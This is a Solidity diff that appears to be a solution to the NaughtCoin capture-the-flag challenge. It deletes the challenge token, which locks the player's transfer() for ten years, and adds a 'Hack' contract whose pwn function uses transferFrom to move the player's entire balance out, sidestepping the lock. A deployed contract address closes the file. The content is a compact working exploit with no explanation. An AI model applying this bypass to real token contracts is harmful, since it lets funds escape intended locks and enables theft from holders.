@@ -1,35 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
+interface INaughtCoin {
+  function player() external view returns (address);
+}
+interface IERC20 {
+  function balanceOf(address account) external view returns (uint256);
+  function  approve(address spender, uint256 amount) external returns (bool);
+  function transferFrom(address sender,address recipient,uint256 amount)external returns (bool);
+}
 
- contract NaughtCoin is ERC20 {
-
-
-  uint public timeLock = block.timestamp + 10 * 365 days;
-  uint256 public INITIAL_SUPPLY;
-  address public player;
-
-  constructor(address _player) 
-  ERC20('NaughtCoin', '0x0') {
-    player = _player;
-    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
-
-    _mint(player, INITIAL_SUPPLY);
-    emit Transfer(address(0), player, INITIAL_SUPPLY);
-  }
-  
-  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
-    super.transfer(_to, _value);
-  }
-
-  modifier lockTokens() {
-    if (msg.sender == player) {
-      require(block.timestamp > timeLock);
-      _;
-    } else {
-     _;
+contract Hack {
+    function pwn(IERC20 coin) external {
+        address player = INaughtCoin(address(coin)).player();
+        uint256 bal = coin.balanceOf(player);
+        coin.transferFrom(player, address(this), bal);
     }
-  } 
-  
-} 
+}
+//0x270CFd2527416122C70E6BbF156f4acC1Ee63C09
